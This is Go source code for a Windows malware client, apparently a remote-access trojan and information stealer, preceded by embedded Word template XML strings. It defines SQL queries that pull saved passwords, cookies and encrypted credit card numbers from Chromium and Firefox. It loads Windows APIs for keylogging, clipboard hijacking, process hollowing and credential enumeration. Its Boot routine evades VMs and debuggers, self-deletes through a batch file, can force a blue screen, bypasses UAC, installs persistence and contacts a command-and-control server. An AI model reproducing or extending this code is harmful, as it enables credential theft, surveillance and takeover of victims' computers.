w:val="00794B27"/><w:rsid w:val="007A73CB"/><w:rsid w:val="007A7846"/><w:rsid w:val="007B2795"/><w:rsid w:val="007F66F5"/><w:rsid w:val="00812400"/><w:rsid w:val="0082203C"/><w:rsid w:val="008360A8"/><w:rsid w:val="008416E0"/><w:rsid w:val="00853E64"/><w:rsid w:val="00895251"/><w:rsid w:val="00897BFF"/><w:rsid w:val="008C61B9"/><w:rsid w:val="00912477"/><w:rsid w:val="009139AF"/><w:rsid w:val="00943B06"/><w:rsid w:val="00945864"/><w:rsid w:val="009806F4"/><w:rsid w:val="009853E9"/><w:rsid w:val="00996E16"/><w:rsid w:val="009B69C5"/><w:rsid w:val="009D3947"/><w:rsid w:val="009F72A7"/><w:rsid w:val="00A119D9"/><w:rsid w:val="00A1309F"/><w:rsid w:val="00A21BED"/><w:rsid w:val="00A27D99"/><w:rsid w:val="00A60D92"/><w:rsid w:val="00A86EAC"/><w:rsid w:val="00A923E7"/><w:rsid w:val="00AA661C"/><w:rsid w:val="00AC2F58"/><w:rsid w:val="00B369B4"/><w:rsid w:val="00B53817"/><w:rsid w:val="00B61F85"/><w:rsid w:val="00BA3CC7"/><w:rsid w:val="00BF457D"/><w:rsid w:val="00BF4775"/><w:rsid w:val="00CA0C45"/><w:rsid w:val="00CC3AB0"/><w:rsid w:val="00CD4A9C"/><w:rsid w:val="00CF12AE"/><w:rsid w:val="00D1798D"/><w:rsid w:val="00D902A4"/><w:rsid w:val="00DB2323"/><w:rsid w:val="00DB331E"/><w:rsid w:val="00DC4E21"/><w:rsid w:val="00DD5358"/><w:rsid w:val="00E224A0"/><w:rsid w:val="00E254F0"/><w:rsid w:val="00E4313F"/><w:rsid w:val="00E51168"/><w:rsid w:val="00E55B4B"/><w:rsid w:val="00E55FC7"/><w:rsid w:val="00E72A21"/><w:rsid w:val="00E7715A"/><w:rsid w:val="00EB48ED"/><w:rsid w:val="00EB700D"/><w:rsid w:val="00F33B83"/><w:rsid w:val="00F41B42"/><w:rsid w:val="00F54BD0"/><w:rsid w:val="00FA0D47"/><w:rsid w:val="00FB3BB2"/><w:rsid w:val="00FF44F1"/><w:rsid w:val="00FF5FDF"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:doNotAutoCompressPictures/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="2049"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w14:docId w14:val="77EBD96F"/><w15:chartTrackingRefBased/></w:settings>`
	documentXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/></Relationships>`
	appXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>testtemplate.dotm</Template><TotalTime>0</TotalTime><Pages>0</Pages><Words>0</Words><Characters>0</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>0</Lines><Paragraphs>0</Paragraphs><ScaleCrop>false</ScaleCrop><Company></Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>0</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>`
	contentTypeXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/><Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/><Override PartName="/word/footnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"/><Override PartName="/word/endnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.endnotes+xml"/><Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/><Override PartName="/word/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>`
	footnotesXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:footnotes xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid wp14"><w:footnote w:type="separator" w:id="-1"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:separator/></w:r></w:p></w:footnote><w:footnote w:type="continuationSeparator" w:id="0"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:continuationSeparator/></w:r></w:p></w:footnote></w:footnotes>`
	endnotesXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:endnotes xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid wp14"><w:endnote w:type="separator" w:id="-1"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:separator/></w:r></w:p></w:endnote><w:endnote w:type="continuationSeparator" w:id="0"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:continuationSeparator/></w:r></w:p></w:endnote></w:endnotes>`
)

//DON'T TOUCH ANYTHING BELLOW THIS LINE UNLESS YOU KNOW WHAT YOU ARE DOING.

var (
	RegisteredWithC2    bool = false
	ClientSleeping      bool = false
	DDoSEnabled              = false
	InstalledName            = ""
	InstalledFolderName      = ""
	InstalledLocationU       = ""
	InstalledLocationA       = ""

	Socks5State       bool = false
	ReverseProxyState bool = false
	RemoteShellState  bool = false
	MinerState        bool = false
	FileHunterState   bool = false
	DefenceActive     bool = true

	PasswordCount int
	CookieCount   int
	CCCount       int

	Log string

	Browsers []Browser

	unrecognizedAddrType = fmt.Errorf("unrecognized address type")
	UserAuthFailed       = fmt.Errorf("user authentication failed")
	NoSupportedAuth      = fmt.Errorf("no supported authentication mechanism")

	queryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	queryChromiumDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	queryFirefoxHistory   = `SELECT id, url, last_visit_date, title, visit_count FROM moz_places`
	queryFirefoxDownload  = `SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id`
	queryFirefoxBookMarks = `SELECT id, url, type, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)`
	queryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
	closeJournalMode      = `PRAGMA journal_mode=off`

	crc16tab = [256]uint16{
		0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50a5, 0x60c6, 0x70e7,
		0x8108, 0x9129, 0xa14a, 0xb16b, 0xc18c, 0xd1ad, 0xe1ce, 0xf1ef,
		0x1231, 0x0210, 0x3273, 0x2252, 0x52b5, 0x4294, 0x72f7, 0x62d6,
		0x9339, 0x8318, 0xb37b, 0xa35a, 0xd3bd, 0xc39c, 0xf3ff, 0xe3de,
		0x2462, 0x3443, 0x0420, 0x1401, 0x64e6, 0x74c7, 0x44a4, 0x5485,
		0xa56a, 0xb54b, 0x8528, 0x9509, 0xe5ee, 0xf5cf, 0xc5ac, 0xd58d,
		0x3653, 0x2672, 0x1611, 0x0630, 0x76d7, 0x66f6, 0x5695, 0x46b4,
		0xb75b, 0xa77a, 0x9719, 0x8738, 0xf7df, 0xe7fe, 0xd79d, 0xc7bc,
		0x48c4, 0x58e5, 0x6886, 0x78a7, 0x0840, 0x1861, 0x2802, 0x3823,
		0xc9cc, 0xd9ed, 0xe98e, 0xf9af, 0x8948, 0x9969, 0xa90a, 0xb92b,
		0x5af5, 0x4ad4, 0x7ab7, 0x6a96, 0x1a71, 0x0a50, 0x3a33, 0x2a12,
		0xdbfd, 0xcbdc, 0xfbbf, 0xeb9e, 0x9b79, 0x8b58, 0xbb3b, 0xab1a,
		0x6ca6, 0x7c87, 0x4ce4, 0x5cc5, 0x2c22, 0x3c03, 0x0c60, 0x1c41,
		0xedae, 0xfd8f, 0xcdec, 0xddcd, 0xad2a, 0xbd0b, 0x8d68, 0x9d49,
		0x7e97, 0x6eb6, 0x5ed5, 0x4ef4, 0x3e13, 0x2e32, 0x1e51, 0x0e70,
		0xff9f, 0xefbe, 0xdfdd, 0xcffc, 0xbf1b, 0xaf3a, 0x9f59, 0x8f78,
		0x9188, 0x81a9, 0xb1ca, 0xa1eb, 0xd10c, 0xc12d, 0xf14e, 0xe16f,
		0x1080, 0x00a1, 0x30c2, 0x20e3, 0x5004, 0x4025, 0x7046, 0x6067,
		0x83b9, 0x9398, 0xa3fb, 0xb3da, 0xc33d, 0xd31c, 0xe37f, 0xf35e,
		0x02b1, 0x1290, 0x22f3, 0x32d2, 0x4235, 0x5214, 0x6277, 0x7256,
		0xb5ea, 0xa5cb, 0x95a8, 0x8589, 0xf56e, 0xe54f, 0xd52c, 0xc50d,
		0x34e2, 0x24c3, 0x14a0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,
		0xa7db, 0xb7fa, 0x8799, 0x97b8, 0xe75f, 0xf77e, 0xc71d, 0xd73c,
		0x26d3, 0x36f2, 0x0691, 0x16b0, 0x6657, 0x7676, 0x4615, 0x5634,
		0xd94c, 0xc96d, 0xf90e, 0xe92f, 0x99c8, 0x89e9, 0xb98a, 0xa9ab,
		0x5844, 0x4865, 0x7806, 0x6827, 0x18c0, 0x08e1, 0x3882, 0x28a3,
		0xcb7d, 0xdb5c, 0xeb3f, 0xfb1e, 0x8bf9, 0x9bd8, 0xabbb, 0xbb9a,
		0x4a75, 0x5a54, 0x6a37, 0x7a16, 0x0af1, 0x1ad0, 0x2ab3, 0x3a92,
		0xfd2e, 0xed0f, 0xdd6c, 0xcd4d, 0xbdaa, 0xad8b, 0x9de8, 0x8dc9,
		0x7c26, 0x6c07, 0x5c64, 0x4c45, 0x3ca2, 0x2c83, 0x1ce0, 0x0cc1,
		0xef1f, 0xff3e, 0xcf5d, 0xdf7c, 0xaf9b, 0xbfba, 0x8fd9, 0x9ff8,
		0x6e17, 0x7e36, 0x4e55, 0x5e74, 0x2e93, 0x3eb2, 0x0ed1, 0x1ef0}

	//TODO:
	// - Switch to using BananaPhone github.com/C-Sto/BananaPhone/pkg/BananaPhone

	user32                         = syscall.MustLoadDLL("user32.dll")
	procGetWindowTextW             = user32.MustFindProc("GetWindowTextW")
	procGetForegroundWindow        = user32.MustFindProc("GetForegroundWindow")
	procShowWindow                 = user32.MustFindProc("ShowWindow")
	procEnumWindows                = user32.MustFindProc("EnumWindows")
	procMessageBoxW                = user32.MustFindProc("MessageBoxW")
	procSystemParametersInfoW      = user32.MustFindProc("SystemParametersInfoW")
	procSendMessageA               = user32.MustFindProc("SendMessageA")
	procGetKeyboardState           = user32.MustFindProc("GetKeyboardState")
	procGetKeyboardLayoutList      = user32.MustFindProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx            = user32.MustFindProc("MapVirtualKeyExW")
	procGetKeyboardLayout          = user32.MustFindProc("GetKeyboardLayout")
	procToUnicodeEx                = user32.MustFindProc("ToUnicodeEx")
	procGetKeyState                = user32.MustFindProc("GetKeyState")
	procGetAsyncKeyState           = user32.MustFindProc("GetAsyncKeyState")
	procIsClipboardFormatAvailable = user32.MustFindProc("IsClipboardFormatAvailable")
	procOpenClipboard              = user32.MustFindProc("OpenClipboard")
	procCloseClipboard             = user32.MustFindProc("CloseClipboard")
	procEmptyClipboard             = user32.MustFindProc("EmptyClipboard")
	procGetClipboardData           = user32.MustFindProc("GetClipboardData")
	procSetClipboardData           = user32.MustFindProc("SetClipboardData")
	procEnumChildWindows           = user32.MustFindProc("EnumChildWindows")

	kernel32                           = syscall.MustLoadDLL("kernel32.dll")
	procIsDebuggerPresent              = kernel32.MustFindProc("IsDebuggerPresent")
	procCheckRemoteDebuggerPresent     = kernel32.MustFindProc("CheckRemoteDebuggerPresent")
	procGetFileSize                    = kernel32.MustFindProc("GetFileSize")
	procIsBadReadPtr                   = kernel32.MustFindProc("IsBadReadPtr")
	procVirtualAlloc                   = kernel32.MustFindProc("VirtualAlloc")
	procVirtualFree                    = kernel32.MustFindProc("VirtualFree")
	procResumeThread                   = kernel32.MustFindProc("ResumeThread")
	procVirtualAllocEx                 = kernel32.MustFindProc("VirtualAllocEx")
	procWriteProcessMemory             = kernel32.MustFindProc("WriteProcessMemory")
	procWow64GetThreadContext          = kernel32.MustFindProc("Wow64GetThreadContext")
	procWow64SetThreadContext          = kernel32.MustFindProc("Wow64SetThreadContext")
	procGetThreadContext               = kernel32.MustFindProc("GetThreadContext")
	procSetThreadContext               = kernel32.MustFindProc("SetThreadContext")
	procSetThreadExecutionState        = kernel32.MustFindProc("SetThreadExecutionState")
	procGlobalAlloc                    = kernel32.MustFindProc("GlobalAlloc")
	procGlobalFree                     = kernel32.MustFindProc("GlobalFree")
	procLocalFree                      = kernel32.MustFindProc("LocalFree")
	procGlobalLock                     = kernel32.MustFindProc("GlobalLock")
	procGlobalUnlock                   = kernel32.MustFindProc("GlobalUnlock")
	proclstrcpyW                       = kernel32.MustFindProc("lstrcpyW")
	procCreateMutex                    = kernel32.MustFindProc("CreateMutexW")
	procVirtualProtect                 = kernel32.MustFindProc("VirtualProtect")
	procCreateProcessA                 = kernel32.MustFindProc("CreateProcessA")
	procReadProcessMemory              = kernel32.MustFindProc("ReadProcessMemory")
	procGetModuleFileNameA             = kernel32.MustFindProc("GetModuleFileNameA")
	procWow64DisableWow64FsRedirection = kernel32.MustFindProc("Wow64DisableWow64FsRedirection")
	procWow64RevertWow64FsRedirection  = kernel32.MustFindProc("Wow64RevertWow64FsRedirection")
	procVirtualProtectEx               = kernel32.MustFindProc("VirtualProtectEx")
	procQueueUserAPC                   = kernel32.MustFindProc("QueueUserAPC")
	procCreateThread                   = kernel32.MustFindProc("CreateThread")
	procCloseHandle                    = kernel32.MustFindProc("CloseHandle")

	ntdll                         = syscall.MustLoadDLL("ntdll.dll")
	procNtSetInformationProcess   = ntdll.MustFindProc("NtSetInformationProcess")
	procRtlAdjustPrivilege        = ntdll.MustFindProc("RtlAdjustPrivilege")
	procNtRaiseHardError          = ntdll.MustFindProc("NtRaiseHardError")
	procNtUnmapViewOfSection      = ntdll.MustFindProc("NtUnmapViewOfSection")
	procRtlCopyMemory             = ntdll.MustFindProc("RtlCopyMemory")
	procNtQueryInformationProcess = ntdll.MustFindProc("NtQueryInformationProcess")

	crypt32         = syscall.MustLoadDLL("Crypt32.dll")
	procDecryptData = crypt32.MustFindProc("CryptUnprotectData")

	avicap32                    = syscall.NewLazyDLL("avicap32.dll")
	proccapCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")

	advapi32           = syscall.MustLoadDLL("Advapi32.dll")
	procCredEnumerateW = advapi32.MustFindProc("CredEnumerateW")
	procCredFree       = advapi32.MustFindProc("CredFree")

	winmm         = syscall.MustLoadDLL("winmm.dll")
	mciSendString = winmm.MustFindProc("mciSendStringW")

	wininet                  = syscall.MustLoadDLL("Wininet.dll")
	procInternetGetCookieExW = wininet.MustFindProc("InternetGetCookieExW")
)

func Boot() { //Start all routines and start the client
	if AntiForensics {
		if LetsPlaySomeGames() { //Stall and do some tasks to fools some detections
			if !DetectHashedName() && !DetectVM() && !DetectDebugger() || !DetectRemoteDebugger() || !DetectProcesses() || !DetectOrganizations() || !DetectHosting() {
				if Campaign {
					if DetectCountry() {
						err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 1 -w 4000 > Nul & Del "`+os.Args[0]+`" > Nul & del "%~f0"`))
						if err == nil {
							cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
							cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
							cmd.Start()
							os.Exit(00)
						}
					}
				}
			} else { // Something Detected, Handle Response
				if AntiForensicsResponse == 0 {
					MessageBox(os.Args[0], "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", 0x00000010)
					os.Exit(111)
				} else if AntiForensicsResponse == 1 {
					os.Exit(19)
				} else if AntiForensicsResponse == 2 {
					for {
						time.Sleep(5 * time.Second)
					}
				} else if AntiForensicsResponse == 3 {
					err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 1 -w 4000 > Nul & Del "`+os.Args[0]+`" > Nul & del "%~f0"`))
					if err == nil {
						cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						cmd.Start()
						os.Exit(69)
					}
				} else if AntiForensicsResponse == 4 {
					TriggerBSOD()
				}
			}
		}
	}

	CheckPrivilege()
	if CheckFirstBoot() {
		if !AdminState && UACBypass {
			go SelectExploit(os.Args[0]) //Leads to Client Exit
			for {
				time.Sleep(5 * time.Second)
			}
		}
		if Install {
			UserKitInstall() //Leads to Client Exit
		}
	} else {
		AlreadyRunning := CheckSingleInstance(core.InstanceKey)
		if AlreadyRunning {
			os.Exit(0)
		}
	}
	if DefenceSystem {
		go ActiveDefence()
	}
	if BlockTaskManager {
		go AntiTaskManager(true)
	}
	if AntiProcessWindow {
		go AntiWindowScanner()
	}
	if Guardian {
		go KeepProcessRunning(InstalledName, os.Args[0])
	}
	if ACG {
		go CallACG()
	}
	MyID, _ = MachineID()
	go GetSettingsC2()
	go ReadC2()
	go UpdateSettings()
	//Start Keylogger if true
	//Start Clipper if true
	//...
}
